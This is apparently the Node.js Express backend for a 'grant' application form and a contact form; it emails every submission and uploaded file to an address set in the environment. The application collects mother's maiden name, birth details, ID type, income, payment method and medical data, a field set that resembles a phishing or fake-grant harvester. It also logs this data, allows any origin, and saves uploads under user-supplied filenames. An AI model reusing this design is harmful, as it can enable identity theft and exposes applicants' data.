const nodemailer = require("nodemailer");
const multer = require("multer");
const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 4000;

// Multer storage configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "uploads/"); // Save files in "uploads" directory
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + "-" + file.originalname); // Rename files to avoid conflicts
  },
});

const upload = multer({ storage });

// Ensure "uploads" directory exists
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
  console.log("Uploads directory created.");
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Endpoint to handle form submission
app.post("/submit-form", upload.single("file"), async (req, res) => {
  console.log("Received data:", req.body);
  console.log("Uploaded file:", req.file);

  const {
    fullName = "N/A",
    email = "N/A",
    phone = "N/A",
    address = {},
    mailingAddress = {},
    occupation = "N/A",
    grantPurpose = "N/A",
    dateOfBirth = {},
    isCitizen = "N/A",
    useCurrentAddress = "N/A",
    maritalStatus = "N/A",
    placeOfBirth = "N/A",
    numberOfChildren = "N/A",
    income = "N/A",
    employer = "N/A",
    educationLevel = "N/A",
    employmentStatus = "N/A",
    mothersMaidenName = "N/A",
    ownCar = "N/A",
    monthlyIncome = "N/A",
    country = "N/A",
    selectedVaccine = "N/A",
    reasonForNoVaccine = "N/A",
    identityCardType = "N/A",
    specialNeeds = "N/A",
    chronicConditions = "N/A",
    medicalBills = "N/A",
    governmentBenefits = "N/A",
    homeStatus = "N/A",
    paymentMethod = "N/A",
    creditDescription = "N/A",
    moneyRequirement = "N/A"
  } = req.body;

  const file = req.file ? req.file.filename : "No file uploaded";

  const emailContent = `
  You have a new form submission:\n\n
  Name: ${fullName}\n
    Email: ${email}\n
    Phone: ${phone}\n
    Address: ${address}\n
    Mailing Address: ${mailingAddress}\n
    Occupation: ${occupation}\n
    Grant Purpose: ${grantPurpose}\n
    Date Of Birth: ${dateOfBirth}\n
    Citizen: ${isCitizen}\n
    Use Current Address: ${useCurrentAddress}\n
    Marital Status: ${maritalStatus}\n
    Place Of Birth: ${placeOfBirth}\n
    Number Of Children: ${numberOfChildren}\n
    Income: ${income}\n
    Employer: ${employer}\n
    Education Level: ${educationLevel}\n
    Employment Status: ${employmentStatus}\n
    Mother's Maiden Name: ${mothersMaidenName}\n
    Own Car: ${ownCar}\n
    Monthly Income: ${monthlyIncome}\n
    Country: ${country}\n
    selectedVaccine: ${selectedVaccine}\n
    Reason For No Vaccine: ${reasonForNoVaccine}\n
    Identity Card Type: ${identityCardType}\n
    Special Needs: ${specialNeeds}\n
    Chronic Conditions: ${chronicConditions}\n
    Medical Bills: ${medicalBills}\n
    Government Benefits: ${governmentBenefits}\n
    Home Status: ${homeStatus}\n
    PaymentMethod: ${paymentMethod}\n
    CreditDescription: ${creditDescription}\n
    MoneyRequirement: ${moneyRequirement}\n
    File: ${file}\n`;
  

  // Nodemailer transporter configuration
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_RECIPIENT,
    subject: "New Form Submission",
    text: emailContent,
    attachments: req.file
      ? [
          {
            filename: req.file.originalname,
            path: path.join(__dirname, "uploads", req.file.filename),
          },
        ]
      : [],
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("Email sent successfully!");
    res.status(200).json({ message: "Form submitted successfully!" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ message: "Failed to submit the form." });
  }
});






const transporter = nodemailer.createTransport({
  service: 'gmail', // You can replace this with your email provider (e.g., Outlook, Yahoo)
  auth: {
    user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS, // Your email password or app password
  },
});

app.post("/submit-contact", async (req, res) => {
  const { fullName, email, phone, info, message } = req.body;

  // Log the received data
  console.log("Contact form data:", { fullName, email, phone, info, message });

  const emailContent = `
    You have a new contact form submission:\n\n
    Full Name: ${fullName}\n
    Email: ${email}\n
    Phone Number: ${phone}\n
    Selected Info: ${info}\n
    Message: ${message}\n
  `;

  // Nodemailer configuration
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_RECIPIENT,
    subject: "New Contact Form Submission",
    text: emailContent,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("Contact form email sent successfully!");
    res.status(200).json({ message: "Contact form submitted successfully!" });
  } catch (error) {
    console.error("Error sending contact form email:", error);
    res.status(500).json({ message: "Failed to submit the contact form." });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
